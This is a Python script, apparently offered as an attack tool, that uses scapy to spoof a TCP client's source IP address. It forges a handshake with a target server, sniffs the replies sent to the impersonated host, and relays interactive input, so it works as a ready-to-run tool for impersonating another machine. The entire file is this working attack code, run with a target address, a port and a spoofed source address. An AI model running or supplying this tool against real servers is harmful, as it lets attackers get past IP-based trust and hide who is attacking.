#### :: MULTI-THREADED IP SPOOFING CLIENT :: ####
#### :: (MAY!) WORKS WITH ALL TCP SERVERS :: ####


import sys
from scapy.all import *


seq_no = 0
ack_no = 0


class ReceiverPA(Thread):
    def __init__(self, source, src_port, target, trg_port):
        Thread.__init__(self)
        self.target = target
        self.trg_port = trg_port
        self.source = source
        self.src_port = src_port

    def run(self):

        global seq_no
        global ack_no

        print("Receiving packets from =>", "tcp and dst host " + self.source)

        while(True):
            packets = None
            packets = sniff(filter="tcp and dst host " + self.source, count=1)

            if packets != None and len(packets) > 0:
                try:
                    if packets[0]['TCP'].flags.PA:
                        send_ack(self.source, self.src_port, self.target, self.trg_port,
                                 packets[0].ack, packets[0].seq + len(packets[0].payload.payload.load), packets[0])
                        seq_no = packets[0].ack
                        ack_no = packets[0].seq + \
                            len(packets[0].payload.payload.load)
                except:
                    pass


def send_ack(source, src_port, target, trg_port, seq, ack, packet):
    ip_header = IP(src=source, dst=target)
    tcp_header = TCP(sport=src_port, dport=trg_port,
                     flags="A", seq=seq, ack=ack)
    ack_packet = ip_header/tcp_header
    send(ack_packet, verbose=0)
    print(packet.payload.payload.load.decode())


def send_psh(source, src_port, target, trg_port, seq, ack, input_data):

    ip_header = IP(src=source, dst=target)
    tcp_header = TCP(sport=src_port, dport=trg_port,
                     flags='PA', seq=seq, ack=ack)

    if(input_data == "quit"):
        sys.exit()

    data = "\n".encode() + input_data.encode() + "\n".encode()
    raw = Raw(load=data)
    ack_packet = sr1(ip_header/tcp_header/raw, verbose=0)

    return ack_packet.ack, ack


def start_client():

    target = "192.168.10.9"
    trg_port = 4321
    source = "100.100.100.100"
    src_port = 4321

    global seq_no
    global ack_no

    if(len(sys.argv) < 4):
        print(
            "usage: ", sys.argv[0], "<target_ip> <target_port> <src_ip> <src_port(opt)>")
        exit()
    else:
        target = sys.argv[1]
        trg_port = int(sys.argv[2])
        source = sys.argv[3]
        if(len(sys.argv) == 5):
            src_port = int(sys.argv[4])

    ip_header = IP(src=source, dst=target)

    # syn
    tcp_header = TCP(sport=src_port, dport=trg_port, flags="S", seq=42)
    syn_packet = ip_header/tcp_header
    syn_ack_packet = sr1(syn_packet, timeout=10, verbose=0)

    # ack (syn ack)
    tcp_header = TCP(sport=syn_ack_packet.dport, dport=trg_port,
                     flags="A", seq=syn_ack_packet.ack, ack=syn_ack_packet.seq + 1)
    ack_packet = ip_header/tcp_header
    send(ack_packet, verbose=0)

    if(syn_ack_packet['TCP'].flags == "R"):
        print("no server found")
        sys.exit(-1)

    receiver = ReceiverPA(source, src_port, target, trg_port)
    receiver.start()
    while(True):
        input_data = input()
        seq_no, ack_no = send_psh(
            source, src_port, target, trg_port, seq_no, ack_no, input_data)


if __name__ == "__main__":
    sys.exit(start_client())
